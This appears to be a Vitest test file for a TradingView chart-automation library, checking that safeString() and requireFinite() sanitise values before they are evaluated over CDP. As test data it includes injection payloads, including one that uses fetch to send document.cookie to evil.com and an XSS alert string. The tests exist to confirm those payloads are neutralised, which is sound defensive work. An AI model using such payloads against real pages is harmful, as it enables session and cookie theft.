import { describe, it, expect } from 'vitest';
import { safeString, requireFinite } from '../../src/core/cdp/evaluate.js';
import { setSymbol, setTimeframe, setType, manageIndicator, setVisibleRange } from '../../src/core/tradingview/chart.js';
import { drawShape } from '../../src/core/tradingview/drawing.js';

function mockEval() {
  const calls: string[] = [];
  const fn = async (expr: string) => { calls.push(expr); return undefined; };
  return { fn, calls };
}

function mockDeps(overrides: Record<string, unknown> = {}) {
  const { fn: evaluate, calls } = mockEval();
  return {
    _deps: {
      evaluate,
      evaluateAsync: evaluate,
      waitForChartReady: async () => true,
      getChartApi: async () => 'window.__api',
      ...overrides,
    },
    calls,
  };
}

describe('safeString() — CDP injection prevention', () => {
  it('wraps normal strings in double quotes', () => {
    expect(safeString('hello')).toBe('"hello"');
  });

  it('escapes double quotes', () => {
    expect(safeString('test"injection')).toBe('"test\\"injection"');
  });

  it('neutralizes template literals', () => {
    expect(JSON.parse(safeString('${alert(1)}'))).toBe('${alert(1)}');
  });

  it('escapes backslashes', () => {
    expect(safeString('test\\injection')).toBe('"test\\\\injection"');
  });

  it('escapes newlines and control chars', () => {
    const result = safeString('line1\nline2\r\ttab');
    expect(result).not.toContain('\n');
    expect(result).toContain('\\n');
  });

  it('handles empty string', () => {
    expect(safeString('')).toBe('""');
  });

  it('prevents classic CDP injection payload', () => {
    const payload = "'); fetch('https://evil.com/steal?c=' + document.cookie); ('";
    expect(JSON.parse(safeString(payload))).toBe(payload);
  });

  it('prevents template literal injection', () => {
    const payload = '`; process.exit(); `';
    expect(JSON.parse(safeString(payload))).toBe(payload);
  });
});

describe('requireFinite() — numeric validation', () => {
  it('passes finite numbers through', () => {
    expect(requireFinite(42, 'test')).toBe(42);
    expect(requireFinite(3.14, 'test')).toBe(3.14);
    expect(requireFinite(-100, 'test')).toBe(-100);
    expect(requireFinite(0, 'test')).toBe(0);
  });

  it('coerces numeric strings', () => {
    expect(requireFinite('42', 'test')).toBe(42);
  });

  it('rejects NaN', () => {
    expect(() => requireFinite(NaN, 'price')).toThrow('price must be a finite number');
  });

  it('rejects Infinity', () => {
    expect(() => requireFinite(Infinity, 'time')).toThrow('time must be a finite number');
    expect(() => requireFinite(-Infinity, 'time')).toThrow('time must be a finite number');
  });

  it('rejects non-numeric strings', () => {
    expect(() => requireFinite('abc', 'value')).toThrow('value must be a finite number');
  });

  it('rejects undefined', () => {
    expect(() => requireFinite(undefined, 'x')).toThrow('x must be a finite number');
  });

  it('includes bad value in error message', () => {
    expect(() => requireFinite('oops', 'field')).toThrow('got: oops');
  });
});

describe('chart.js — sanitized evaluate calls', () => {
  it('setSymbol uses safeString in evaluate', async () => {
    const { _deps, calls } = mockDeps();
    await setSymbol({ symbol: 'NYMEX:CL1!', _deps });
    const call = calls.find(c => c.includes('setSymbol'));
    expect(call).toBeDefined();
    expect(call).toContain('"NYMEX:CL1!"');
  });

  it('setSymbol sanitizes injection payload', async () => {
    const { _deps, calls } = mockDeps();
    const payload = "'; alert('xss'); //";
    await setSymbol({ symbol: payload, _deps });
    const call = calls.find(c => c.includes('setSymbol'));
    expect(call).toContain(safeString(payload));
  });

  it('setTimeframe uses safeString', async () => {
    const { _deps, calls } = mockDeps();
    await setTimeframe({ timeframe: '15', _deps });
    const call = calls.find(c => c.includes('setResolution'));
    expect(call).toContain('"15"');
  });

  it('setType validates chart type range 0-9', async () => {
    const { _deps } = mockDeps();
    for (const name of ['Candles', 'Line', 'Area', 'HeikinAshi']) {
      const r = await setType({ chart_type: name, _deps });
      expect(r.success).toBe(true);
    }
    for (const n of [0, 1, 5, 9]) {
      const r = await setType({ chart_type: String(n), _deps });
      expect(r.success).toBe(true);
    }
  });

  it('setType rejects invalid chart types', async () => {
    const { _deps } = mockDeps();
    for (const bad of ['invalid', '10', '-1', '1.5', 'NaN']) {
      await expect(setType({ chart_type: bad, _deps })).rejects.toThrow('Unknown chart type');
    }
  });

  it('setVisibleRange validates from/to with requireFinite', async () => {
    const { _deps } = mockDeps();
    await expect(setVisibleRange({ from: NaN, to: 100, _deps })).rejects.toThrow('from must be a finite number');
    await expect(setVisibleRange({ from: 100, to: Infinity, _deps })).rejects.toThrow('to must be a finite number');
  });

  it('setVisibleRange passes valid numbers to evaluate', async () => {
    const { _deps, calls } = mockDeps();
    await setVisibleRange({ from: 1700000000, to: 1700100000, _deps });
    const call = calls.find(c => c.includes('zoomToBarsRange'));
    expect(call).toBeDefined();
    expect(call).toContain('1700000000');
    expect(call).toContain('1700100000');
  });
});

describe('drawing.js — sanitized evaluate calls', () => {
  it('drawShape validates point coordinates with requireFinite', async () => {
    const { _deps } = mockDeps();
    await expect(
      drawShape({ shape: 'horizontal_line', point: { time: NaN, price: 100 }, _deps }),
    ).rejects.toThrow('point.time must be a finite number');
    await expect(
      drawShape({ shape: 'horizontal_line', point: { time: 100, price: Infinity }, _deps }),
    ).rejects.toThrow('point.price must be a finite number');
  });

  it('drawShape validates point2 coordinates', async () => {
    const { _deps } = mockDeps();
    await expect(
      drawShape({
        shape: 'trend_line',
        point: { time: 100, price: 50 },
        point2: { time: NaN, price: 60 },
        _deps,
      }),
    ).rejects.toThrow('point2.time must be a finite number');
  });

  it('drawShape uses safeString for shape name', async () => {
    const { _deps, calls } = mockDeps();
    await drawShape({ shape: 'horizontal_line', point: { time: 100, price: 50 }, _deps });
    const call = calls.find(c => c.includes('createShape'));
    expect(call).toBeDefined();
    expect(call).toContain('"horizontal_line"');
  });

  it('drawShape multipoint uses safeString and requireFinite', async () => {
    const { _deps, calls } = mockDeps();
    await drawShape({
      shape: 'trend_line',
      point: { time: 100, price: 50 },
      point2: { time: 200, price: 60 },
      _deps,
    });
    const call = calls.find(c => c.includes('createMultipointShape'));
    expect(call).toBeDefined();
    expect(call).toContain('"trend_line"');
  });
});
